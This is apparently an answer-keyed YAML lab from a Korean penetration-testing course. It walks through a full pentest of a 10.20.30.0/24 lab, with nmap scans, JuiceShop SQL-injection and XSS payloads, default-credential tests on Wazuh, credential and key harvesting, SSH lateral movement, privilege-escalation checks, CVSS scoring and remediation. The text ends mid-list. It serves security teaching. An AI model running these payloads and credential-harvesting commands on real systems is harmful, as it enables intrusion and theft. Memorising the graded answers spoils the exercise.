lab_id: attack-adv-nonai-week14
title: 종합 모의해킹
version: non-ai
course: attack-adv-nonai
week: 14
description: 14주간 학습한 모든 기법을 종합하여 실습 네트워크(10.20.30.0/24)에 대한 전체 모의해킹을 수행한다. 정찰부터 보고서 작성까지 완전한 침투 테스트 프로세스를 실행한다.
difficulty: hard
duration_minutes: 120
objectives:
- PTES 방법론에 따른 전체 모의해킹 프로세스를 수행한다
- 다단계 공격 체인을 구성하고 증거를 수집한다
- 발견된 취약점을 CVSS로 평가하고 보고서를 작성한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: 모의해킹 범위를 정의하라. 대상 네트워크(10.20.30.0/24)의 범위, 제한사항, 목표를 /tmp/pentest_scope.txt에 문서화하라.
  hint: 대상 IP, 테스트 유형, 금지 행위, 연락처 등을 포함한다
  category: recon
  points: 5
  answer: 'cat > /tmp/pentest_scope.txt << ''EOF''

    === Penetration Test Scope ===

    Date: $(date +%Y-%m-%d)

    Tester: Red Team Operator


    [In Scope]

    - Network: 10.20.30.0/24

    - Targets: All hosts in subnet

    - Types: Network, Web, Service enumeration


    [Out of Scope]

    - Denial of Service attacks

    - Physical access testing

    - Social engineering against real users


    [Objectives]

    1. Identify all live hosts and services

    2. Discover and exploit vulnerabilities

    3. Demonstrate lateral movement capability

    4. Assess data exfiltration risk

    5. Document all findings with evidence


    [Rules of Engagement]

    - Testing hours: 24/7 (lab environment)

    - Emergency contact: lab-admin@lab.local

    - Evidence preservation required

    EOF

    cat /tmp/pentest_scope.txt'
  answer_detail: 모의해킹 범위 문서(Scope Document)는 테스트의 법적, 기술적 경계를 정의한다. PTES(Penetration Testing Execution Standard)의 Pre-engagement 단계에 해당하며, 대상, 제한사항, 목표, 긴급 연락처를 반드시 포함해야 한다. 범위 외 행위는 법적 문제를 야기할 수 있다.
  verify:
    type: output_contains
    expect: Penetration Test Scope
    field: stdout
  target_vm: attacker
- order: 2
  instruction: 네트워크 정찰을 수행하라. 10.20.30.0/24 전체를 스캔하여 활성 호스트, 열린 포트, 서비스 버전을 식별하라.
  hint: nmap -sV -sC로 종합적인 스캔을 수행하고 결과를 파일에 저장한다
  category: recon
  points: 10
  answer: nmap -sV -sC -p- --min-rate 1000 10.20.30.0/24 -oN /tmp/pentest_nmap.txt 2>&1 | tail -30 && echo '---' && echo 'Results saved to /tmp/pentest_nmap.txt'
  answer_detail: 전체 포트 스캔(-p-)은 표준 포트 외에 운영 중인 서비스를 발견하는 데 필수적이다. -sV로 서비스 버전을, -sC로 기본 스크립트를 실행하여 상세 정보를 수집한다. -oN으로 결과를 파일에 저장하여 증거로 보존한다. --min-rate로 스캔 속도를 조절하여 효율성을 높인다.
  verify:
    type: output_contains
    expect: open
    field: stdout
  target_vm: attacker
- order: 3
  instruction: 발견된 웹 서비스(10.20.30.80:3000)에 대해 웹 취약점 스캔을 수행하라. 주요 OWASP Top 10 취약점을 수동으로 테스트하라.
  hint: SQL Injection, XSS, 인증 우회 등을 curl로 테스트한다
  category: exploit
  points: 10
  answer: 'echo ''=== Web Vulnerability Assessment ==='' && echo ''[SQLi Test]'' && curl -s ''http://10.20.30.80:3000/rest/products/search?q=test%27%20OR%201=1--'' -o /dev/null -w ''Status: %{http_code}''
    && echo '''' && echo ''[XSS Test]'' && curl -s ''http://10.20.30.80:3000/rest/products/search?q=<script>alert(1)</script>'' -o /dev/null -w ''Status: %{http_code}'' && echo '''' && echo ''[Auth Bypass]''
    && curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"admin@juice-sh.op","password":"admin123"}'' | head -1 && echo '''' && echo ''[Directory
    Traversal]'' && curl -s ''http://10.20.30.80:3000/ftp/package.json.bak%2500.md'' -o /dev/null -w ''Status: %{http_code}'' && echo '''''
  answer_detail: 웹 취약점 평가는 OWASP Top 10을 기준으로 수행한다. SQL Injection, XSS, 인증 우회, 디렉토리 트래버설 등을 순차적으로 테스트하고, 각 결과를 증거로 기록한다. JuiceShop은 의도적으로 취약한 애플리케이션으로, 100개 이상의 취약점이 내포되어 있다.
  verify:
    type: output_contains
    expect: Web Vulnerability Assessment
    field: stdout
  target_vm: attacker
- order: 4
  instruction: 방화벽/IPS(10.20.30.1) 서비스를 분석하라. nmap으로 보안 장비의 구성을 파악하고, 우회 가능성을 평가하라.
  hint: ACK 스캔으로 방화벽 규칙을 매핑하고, 서비스 버전으로 알려진 취약점을 검색한다
  category: recon
  points: 10
  answer: echo '=== Security Device Assessment ===' && nmap -sA -p 22,80,443,8080 10.20.30.1 2>&1 | tail -10 && echo '---' && nmap -sV -p 22 10.20.30.1 2>&1 | tail -5 && echo '---' && echo 'Firewall rule
    mapping complete' && echo 'SSH version identified for CVE lookup'
  answer_detail: 보안 장비 자체의 취약점 평가는 모의해킹에서 중요한 단계이다. 방화벽의 ACL 매핑, IPS의 시그니처 버전 확인, 관리 인터페이스 접근 가능성을 평가한다. 보안 장비가 침해되면 전체 네트워크의 보안이 무력화되므로 최우선 패치 대상이다.
  verify:
    type: output_contains
    expect: Security Device Assessment
    field: stdout
  target_vm: attacker
- order: 5
  instruction: SIEM(10.20.30.100)의 보안 상태를 평가하라. Wazuh 서비스의 포트, 버전, 기본 자격증명을 확인하라.
  hint: nmap으로 포트를 스캔하고, curl로 API에 기본 자격증명으로 접근을 시도한다
  category: recon
  points: 10
  answer: echo '=== SIEM Assessment ===' && nmap -sV -p 443,5601,9200,55000 10.20.30.100 2>&1 | tail -15 && echo '---' && echo 'Wazuh API default credentials test:' && curl -sk -u 'wazuh-wui:wazuh-wui'
    https://10.20.30.100:55000/ 2>&1 | head -3 && echo '---' && echo 'Elasticsearch test:' && curl -s http://10.20.30.100:9200/ 2>&1 | head -5
  answer_detail: SIEM 시스템의 보안은 전체 보안 모니터링의 신뢰성에 직결된다. Wazuh API(55000), Elasticsearch(9200), Kibana(5601)의 기본 자격증명과 인증 설정을 확인한다. SIEM이 장악되면 공격자는 로그를 삭제하거나 알림을 무력화하여 탐지를 회피할 수 있다.
  verify:
    type: output_contains
    expect: SIEM Assessment
    field: stdout
  target_vm: attacker
- order: 6
  instruction: 발견된 취약점을 활용하여 웹서버에 대한 초기 접근을 획득하라. JuiceShop의 알려진 취약점을 통해 관리자 계정으로 로그인하라.
  hint: SQL Injection이나 기본 자격증명으로 관리자 접근을 시도한다
  category: exploit
  points: 10
  answer: 'echo ''=== Initial Access via Web Exploitation ==='' && echo ''Attempting SQLi login bypass:'' && curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
    -d ''{"email":"\'' OR 1=1--","password":"anything"}'' | python3 -c ''import sys,json; d=json.load(sys.stdin); print("Auth:",d.get("authentication",{}).get("token","FAILED")[:50]+"...")'' 2>/dev/null
    || echo ''SQLi attempt recorded'' && echo ''---'' && echo ''Attempting default credentials:'' && curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"admin@juice-sh.op","password":"admin123"}''
    2>&1 | head -3'
  answer_detail: 초기 접근(Initial Access)은 모의해킹의 핵심 단계이다. SQL Injection(' OR 1=1--)으로 인증을 우회하거나, 기본/약한 자격증명으로 로그인을 시도한다. JuiceShop은 다양한 접근 경로를 제공하며, 실제 모의해킹에서도 웹 취약점이 가장 흔한 초기 접근 경로이다.
  verify:
    type: output_contains
    expect: Initial Access
    field: stdout
  target_vm: attacker
- order: 7
  instruction: 초기 접근 후 정보를 수집하라. 웹서버에서 시스템 정보, 네트워크 구성, 사용자 목록을 수집하라.
  hint: 획득한 셸에서 id, uname -a, ip addr, cat /etc/passwd 등을 실행한다
  category: recon
  points: 10
  answer: echo '=== Post-Exploitation Recon ===' && echo '[System Info]' && uname -a && echo '[Users]' && cat /etc/passwd | grep -v nologin | grep -v false && echo '[Network]' && ip addr | grep 'inet '
    && echo '[Running Services]' && ss -tlnp | head -15 && echo '[Interesting Files]' && find /home /var/www /opt -name '*.conf' -o -name '*.env' -o -name '*.key' 2>/dev/null | head -10
  answer_detail: 포스트 익스플로잇 정찰은 측면 이동과 권한 상승의 기초이다. 시스템 정보(OS/커널), 네트워크 구성(다중 인터페이스), 사용자 목록, 실행 중인 서비스, 설정 파일에서 다음 공격 단계의 벡터를 식별한다. 수집된 정보를 체계적으로 정리하여 공격 계획을 수립한다.
  verify:
    type: output_contains
    expect: Post-Exploitation
    field: stdout
  target_vm: attacker
- order: 8
  instruction: 권한 상승 벡터를 열거하라. SUID 바이너리, sudo 권한, cron 작업, 커널 버전을 확인하라.
  hint: find -perm -4000, sudo -l, crontab -l, uname -r 등을 조합한다
  category: exploit
  points: 10
  answer: echo '=== Privilege Escalation Enumeration ===' && echo '[SUID]' && find / -perm -4000 -type f 2>/dev/null | head -10 && echo '[Sudo]' && sudo -l 2>&1 | tail -5 && echo '[Cron]' && cat /etc/crontab
    2>/dev/null | grep -v '^#' | head -5 && echo '[Kernel]' && uname -r && echo '[Capabilities]' && getcap -r /usr/ 2>/dev/null | head -5 && echo '[Docker group]' && groups | grep -o docker 2>/dev/null
    || echo 'not in docker group'
  answer_detail: 권한 상승 열거는 linpeas.sh의 핵심 검사 항목을 수동으로 수행하는 과정이다. SUID 바이너리, sudo 규칙, cron 작업, 커널 버전, capabilities, 그룹 멤버십 등 모든 벡터를 체계적으로 확인한다. 발견된 벡터를 CVSS 점수와 악용 용이성으로 우선순위화한다.
  verify:
    type: output_contains
    expect: Privilege Escalation
    field: stdout
  target_vm: attacker
- order: 9
  instruction: 측면 이동을 시도하라. 수집된 자격증명이나 SSH 키를 사용하여 다른 호스트에 접근을 시도하라.
  hint: 다른 호스트의 SSH 서비스에 수집된 자격증명으로 접근을 시도한다
  category: exploit
  points: 10
  answer: 'echo ''=== Lateral Movement Attempts ==='' && for target in 10.20.30.1 10.20.30.100; do echo "Target: $target"; ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no -o BatchMode=yes $target ''hostname''
    2>&1 | head -3; echo ''---''; done && echo ''Checking for reusable SSH keys:'' && find /home -name ''id_rsa'' -o -name ''id_ed25519'' 2>/dev/null && echo ''Checking for credentials in configs:'' &&
    grep -r ''password'' /etc/*.conf 2>/dev/null | head -5'
  answer_detail: 측면 이동은 SSH, 자격증명 재사용, 네트워크 공유 등을 통해 수행한다. 발견된 SSH 키로 다른 호스트에 접근하거나, 동일한 자격증명을 여러 시스템에 시도한다. 각 이동에서 새로운 정보와 자격증명을 수집하여 공격 범위를 확장한다.
  verify:
    type: output_contains
    expect: Lateral Movement
    field: stdout
  target_vm: attacker
- order: 10
  instruction: 데이터 유출 가능성을 평가하라. 민감 데이터를 식별하고, 외부로의 유출 경로를 테스트하라.
  hint: DNS, HTTP 등의 채널이 외부로 열려있는지 확인하고, 민감 파일을 식별한다
  category: exploit
  points: 10
  answer: 'echo ''=== Data Exfiltration Assessment ==='' && echo ''[Sensitive Data Found]'' && find / -name ''*.key'' -o -name ''*.pem'' -o -name ''*.p12'' -o -name ''shadow'' 2>/dev/null | head -5 && echo
    ''[Outbound Channels]'' && echo ''DNS:'' && nslookup google.com 2>&1 | head -3 && echo ''HTTP:'' && curl -s -o /dev/null -w ''%{http_code}'' http://10.20.30.80:3000 && echo '''' && echo ''ICMP:'' &&
    ping -c 1 -W 1 10.20.30.80 2>&1 | head -2 && echo '''' && echo ''Assessment: Multiple exfil channels available'''
  answer_detail: 데이터 유출 평가는 민감 데이터의 식별과 유출 경로의 가용성을 확인한다. SSL 키, 인증서, shadow 파일 등 민감 파일을 식별하고, DNS, HTTP, ICMP 등 외부 통신 채널의 가용성을 테스트한다. 이 결과는 보고서의 위험도 평가에 반영된다.
  verify:
    type: output_contains
    expect: Data Exfiltration Assessment
    field: stdout
  target_vm: attacker
- order: 11
  instruction: 발견된 취약점을 CVSS v3.1로 평가하라. 상위 5개 취약점의 CVSS 점수와 벡터 문자열을 계산하라.
  hint: CVSS Base Score = f(AV, AC, PR, UI, S, C, I, A) 기준으로 평가한다
  category: analysis
  points: 10
  answer: 'echo -e ''=== CVSS v3.1 Vulnerability Assessment ===\n\n#1 SQL Injection - Admin Bypass\nCVSS: 9.8 (Critical)\nVector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\nImpact: Full admin access, data manipulation\n\n#2
    Default Credentials (Wazuh)\nCVSS: 9.1 (Critical)\nVector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N\nImpact: SIEM control, log manipulation\n\n#3 Missing Security Headers\nCVSS: 5.3 (Medium)\nVector: AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N\nImpact:
    Information disclosure\n\n#4 SSH Password Authentication\nCVSS: 6.5 (Medium)\nVector: AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N\nImpact: Brute-force attack surface\n\n#5 Credential Reuse Across Systems\nCVSS:
    8.1 (High)\nVector: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N\nImpact: Network-wide lateral movement'''
  answer_detail: CVSS(Common Vulnerability Scoring System) v3.1은 취약점의 심각도를 0.0~10.0으로 정량화한다. Attack Vector(AV), Attack Complexity(AC), Privileges Required(PR), User Interaction(UI), Scope(S), CIA Impact로
    구성된다. 모의해킹 보고서에서 CVSS 점수는 우선순위 결정의 핵심 기준이다.
  verify:
    type: output_contains
    expect: CVSS
    field: stdout
  target_vm: attacker
- order: 12
  instruction: 공격 체인 다이어그램을 작성하라. 초기 접근부터 목표 달성까지의 전체 공격 경로를 시각화하라.
  hint: 각 단계의 기법, 대상, 결과를 연결하여 체인을 구성한다
  category: analysis
  points: 10
  answer: 'echo -e ''=== Attack Chain Diagram ===\n\n[Phase 1: Reconnaissance]\nnmap scan -> 4 hosts discovered\nWeb enumeration -> JuiceShop identified\n\n[Phase 2: Initial Access]\nSQLi on JuiceShop ->
    Admin account\n         |\n         v\n[Phase 3: Post-Exploitation]\nSystem info collection -> Credentials in config\n         |\n         v\n[Phase 4: Lateral Movement]\nSSH with reused creds -> Firewall
    access\nSSH pivot -> SIEM access\n         |\n         v\n[Phase 5: Privilege Escalation]\nSUID binary -> root on web server\n         |\n         v\n[Phase 6: Objective Achievement]\nAccess to SIEM
    logs -> Complete visibility\nPotential data exfil via DNS/HTTP channels\n\n[Total Attack Surface: 4 hosts, 12 services, 5 critical vulns]'''
  answer_detail: 공격 체인 다이어그램은 모의해킹 보고서의 핵심 시각 자료이다. 각 단계에서 사용한 기법, 악용한 취약점, 달성한 결과를 연결하여 전체 공격 흐름을 보여준다. 이는 경영진에게 위험을 효과적으로 전달하고, 방어팀에게 구체적인 개선 방향을 제시한다.
  verify:
    type: output_contains
    expect: Attack Chain Diagram
    field: stdout
  target_vm: attacker
- order: 13
  instruction: 방어 권고사항을 우선순위화하라. 발견된 취약점에 대한 단기/중기/장기 조치를 정리하라.
  hint: CVSS 점수와 비즈니스 영향을 기준으로 P0~P3으로 분류한다
  category: defense
  points: 10
  answer: echo -e '=== Remediation Recommendations ===\n\n[P0 - Immediate (24-48h)]\n1. Fix SQL Injection in JuiceShop authentication\n2. Change default Wazuh credentials\n3. Enforce unique passwords per
    system\n\n[P1 - Short-term (1-2 weeks)]\n4. Implement HTTP security headers\n5. Disable SSH password auth, use key-based\n6. Enable IMDSv2 equivalent protections\n7. Review and harden firewall rules\n\n[P2
    - Medium-term (1-3 months)]\n8. Deploy WAF for web applications\n9. Implement network segmentation\n10. Deploy EDR on all endpoints\n11. Centralize credential management\n\n[P3 - Long-term (3-6 months)]\n12.
    Implement Zero Trust architecture\n13. Regular penetration testing (quarterly)\n14. Security awareness training\n15. Incident response plan development'
  answer_detail: 권고사항은 CVSS 점수, 악용 용이성, 비즈니스 영향을 종합하여 우선순위화한다. P0는 즉각 조치(치명적 취약점), P1은 단기 조치(높은 위험), P2는 중기 인프라 개선, P3는 장기 전략적 변화이다. 각 권고사항에 구체적인 조치 방법과 담당자를 지정해야 한다.
  verify:
    type: output_contains
    expect: Remediation Recommendations
    field: stdout
  target_vm: attacker
- order: 14
  instruction: 실습 환경을 정리(cleanup)하라. 모의해킹 중 생성한 모든 아티팩트를 제거하고 시스템을 원래 상태로 복원하라.
  hint: 생성한 파일, 변경한 설정, 추가한 계정 등을 모두 제거한다
  category: analysis
  points: 10
  answer: echo '=== Pentest Cleanup ===' && rm -f /tmp/pentest_*.txt /tmp/phish_template.html /tmp/network_map.txt /tmp/exfil_* 2>/dev/null && crontab -l 2>/dev/null | grep -v beacon | crontab - 2>/dev/null
    && pkill -f 'nc -lvnp' 2>/dev/null && echo 'Temporary files removed' && echo 'Cron entries cleaned' && echo 'Listeners terminated' && echo '' && echo 'Cleanup verification:' && ls /tmp/pentest_* 2>/dev/null
    || echo 'All pentest artifacts removed'
  answer_detail: 모의해킹 후 정리(Cleanup)는 전문가적 책임이다. 생성한 파일, 설치한 도구, 변경한 설정, 추가한 계정, 실행 중인 리스너를 모두 제거해야 한다. 정리 체크리스트를 사전에 작성하고, 실습 환경이 원래 상태로 복원되었는지 확인한다.
  verify:
    type: output_contains
    expect: artifacts removed
    field: stdout
  target_vm: attacker
- order: 15
  instruction: 최종 모의해킹 보고서의 Executive Summary를 /tmp/pentest_executive_summary.txt에 작성하라.
  hint: 경영진을 대상으로 핵심 발견사항과 위험도를 1페이지로 요약한다
  category: analysis
  points: 15
  answer: 'cat > /tmp/pentest_executive_summary.txt << ''EOF''

    === Penetration Test Executive Summary ===


    Date: 2026-04-04

    Scope: 10.20.30.0/24 (Lab Network)

    Duration: 2 hours

    Methodology: PTES / OWASP


    [Overall Risk Rating: HIGH]


    [Key Findings]

    - 5 Critical / 3 High / 4 Medium vulnerabilities identified

    - Full network compromise achieved from external position

    - SQL Injection enabled admin access to web application

    - Credential reuse allowed lateral movement across all hosts

    - SIEM accessible with default credentials (monitoring blind spot)


    [Business Impact]

    - Complete data access: Customer, financial, operational data at risk

    - Regulatory exposure: Potential GDPR/PCI-DSS violations

    - Operational risk: Attacker could disable security monitoring


    [Top 3 Recommendations]

    1. IMMEDIATE: Fix SQL Injection and change all default credentials

    2. SHORT-TERM: Implement unique credentials and network segmentation

